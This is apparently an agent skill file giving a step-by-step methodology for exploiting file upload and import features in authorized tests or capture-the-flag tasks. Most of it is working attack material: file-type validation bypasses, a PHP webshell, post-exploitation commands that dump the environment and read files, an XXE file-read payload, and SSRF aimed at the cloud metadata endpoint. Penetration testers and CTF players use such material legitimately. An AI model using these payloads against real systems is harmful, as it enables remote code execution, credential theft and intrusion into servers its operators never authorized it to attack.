---
name: file-upload-methodology
description: Use when a target has file upload, import, format-conversion, or file-type-validation functionality and you want to achieve RCE, webshell, or bypass a file-type check. Covers extension/content-type/magic-byte bypasses, polyglots, and path traversal in upload.
---

# File Upload Exploitation Methodology

Authorized testing only. Goal: upload an executable/malicious file past validation, or abuse file handling.

## Recon

- What validation exists: client-side only (bypass trivially), extension blacklist, extension whitelist, content-type check, magic-byte check, content analysis, image re-processing.
- Where do files land, and is that path web-accessible / executable? Find the stored URL.

## Bypass Techniques

**Extension**
- Double extension: `shell.php.jpg`, `shell.jpg.php`.
- Alternate exec extensions: `.phtml .php3 .php5 .phar .pht` (PHP); `.jsp .jspx .jsw` (Java); `.asp .aspx .asa .cer`.
- Case: `.pHp`, `.PhP`.
- Trailing tricks: `shell.php%00.jpg` (null byte), `shell.php.` (trailing dot), `shell.php ` (trailing space), `shell.php::$DATA` (Windows).
- Path traversal in filename: `../../../var/www/html/shell.php` to escape upload dir.

**Content-Type / magic bytes**
- Spoof `Content-Type: image/png` on a php file.
- Prepend valid magic bytes: `GIF89a;` + `<?php ...`, or real image header.
- Polyglot: valid image AND valid script (e.g., PHAR-JPG polyglot, GIF-PHP). Relevant to "satisfy multiple format semantics".

**Content analysis / re-processing**
- If images are re-encoded, embed payload in EXIF that survives, or use image-tragick / imagemagick CVEs.
- SVG upload → XSS/XXE (SVG is XML).

**Archive-based** (import/extract features)
- Zip Slip: path traversal inside archive entry names to write outside extraction dir.
- Symlink in tar/zip to read arbitrary files.

**XML import** → XXE (see below); **CSV import** → formula injection / CSV injection.

## After Upload

- Access the uploaded file URL to trigger execution.
- Webshell: `<?php system($_GET['c']); ?>` then `?c=cat /flag`.
- Confirm with `id`/`whoami`, then hunt flag: `find / -name 'flag*'; cat /flag*; env`.

## XXE (XML upload/import)

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]>
<root>&x;</root>
```
- Blind XXE → out-of-band via external DTD to a callback.
- SSRF via XXE: `SYSTEM "http://169.254.169.254/..."`.

## Output

Report: upload feature, validation observed, the bypass used, uploaded artifact URL, execution evidence, flag.
